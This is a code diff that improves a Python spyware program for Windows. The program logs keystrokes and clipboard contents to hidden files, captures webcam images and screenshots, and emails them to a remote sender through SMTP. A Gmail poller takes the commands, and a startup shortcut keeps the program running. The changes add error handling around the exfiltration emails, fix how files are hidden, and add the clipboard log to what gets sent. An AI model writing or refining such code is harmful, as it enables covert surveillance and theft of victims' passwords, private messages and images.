@@ -49,7 +49,7 @@ POLL_INTERVAL = 2
 CAM_OUTPUT_FILE = Path("webcam.jpg")
 SS_OUTPUT_FILE  = Path("screenshot.png")
 FILE_ATTRIBUTE_HIDDEN = 0x02
-SHORTCUT_PATH=Path("")
+SHORTCUT_PATH=None
 
 log_lock = threading.Lock()
 
@@ -59,7 +59,7 @@ stop_event = threading.Event()
 
 ## cleanup
 
-def cleanup():
+def cleanup(sender: str):
     """Delete the output file and the startup shortcut."""
     print("\n[!] Ctrl+C detected — cleaning up...")
  
@@ -75,7 +75,7 @@ def cleanup():
     if os.path.exists(SS_OUTPUT_FILE):
         os.remove(SS_OUTPUT_FILE)
  
-    if os.path.exists(SHORTCUT_PATH):
+    if SHORTCUT_PATH and os.path.exists(SHORTCUT_PATH):
         os.remove(SHORTCUT_PATH)
     else:
         print(f"[~] Shortcut not found (already gone?): {SHORTCUT_PATH}")
@@ -203,8 +203,8 @@ class GmailPoller(threading.Thread):
 # ── Keystroke thread ───────────────────────────────────────────────────────────
 
 def run_keylogger(stop_event: threading.Event) -> None:
-    ctypes.windll.kernel32.SetFileAttributesW(OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     log_file = OUTPUT_FILE.open("a", encoding="utf-8")
+    ctypes.windll.kernel32.SetFileAttributesW(str(OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with log_lock:
         log_file.write(f"--- Recording started at {ts} ---\n")
@@ -253,7 +253,7 @@ def capture_webcam(sender: str):
         return
 
     cv2.imwrite(str(CAM_OUTPUT_FILE), frame)
-    ctypes.windll.kernel32.SetFileAttributesW(CAM_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
+    ctypes.windll.kernel32.SetFileAttributesW(str(CAM_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
     print(f"Webcam image saved to {CAM_OUTPUT_FILE}")
 
     # Send it back via email
@@ -269,10 +269,14 @@ def capture_webcam(sender: str):
     part.add_header("Content-Disposition", "attachment; filename=webcam.jpg")
     msg.attach(part)
 
-    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
-        server.starttls()
-        server.login(EMAIL_ADDRESS, EMAIL_PASS)
-        server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+    try:
+        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASS)
+            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+        print(f"Webcam image sent to {sender}")
+    except Exception as e:
+        print(f"capture_webcam: failed to send email: {e}")
 
     print(f"Webcam image sent to {sender}")
 
@@ -280,7 +284,7 @@ def capture_webcam(sender: str):
 def capture_screenshot(sender: str):
     screenshot = pyautogui.screenshot()
     screenshot.save(str(SS_OUTPUT_FILE))
-    ctypes.windll.kernel32.SetFileAttributesW(SS_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
+    ctypes.windll.kernel32.SetFileAttributesW(str(SS_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
     print(f"Screenshot saved to {SS_OUTPUT_FILE}")
 
     # Send it back via email
@@ -296,17 +300,21 @@ def capture_screenshot(sender: str):
     part.add_header("Content-Disposition", "attachment; filename=screenshot.png")
     msg.attach(part)
 
-    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
-        server.starttls()
-        server.login(EMAIL_ADDRESS, EMAIL_PASS)
-        server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+    try:
+        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASS)
+            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+        print(f"Screenshot sent to {sender}")
+    except Exception as e:
+        print(f"capture_screenshot: failed to send email: {e}")
 
     print(f"Screenshot sent to {sender}")        
 # ── Clipboard monitor thread ───────────────────────────────────────────────────
 
 def run_clipboard_monitor(stop_event: threading.Event)->None:
-    ctypes.windll.kernel32.SetFileAttributesW(CLIP_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     clip_file = CLIP_OUTPUT_FILE.open("a", encoding="utf-8")
+    ctypes.windll.kernel32.SetFileAttributesW(str(CLIP_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     clip_file.write(f"--- Clipboard monitor started at {ts} ---\n")
     clip_file.flush()
@@ -351,10 +359,11 @@ def run_clipboard_monitor(stop_event: threading.Event)->None:
 # ---IMAP/SMTP --------------------------------------------------------------------
 
 def send_log(sender: str):
-    if not OUTPUT_FILE.exists():
-        print("send_log: keylog.txt does not exist yet.")
-        return
-
+    for filepath in [OUTPUT_FILE, CLIP_OUTPUT_FILE]:
+        if not filepath.exists():
+            print(f"send_log: {filepath.name} does not exist yet.")
+            return
+        
     msg = MIMEMultipart()
     msg["From"]    = EMAIL_ADDRESS
     msg["To"]      = sender
@@ -369,10 +378,14 @@ def send_log(sender: str):
         part.add_header("Content-Disposition", f"attachment; filename={filepath.name}")
         msg.attach(part)
 
-    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
-        server.starttls()
-        server.login(EMAIL_ADDRESS, EMAIL_PASS)
-        server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+    try:
+        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASS)
+            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+        print(f"Sent logs to {sender}")
+    except Exception as e:
+        print(f"send_log: failed to send email: {e}")
 
     print(f"Sent logs to {sender}")
 
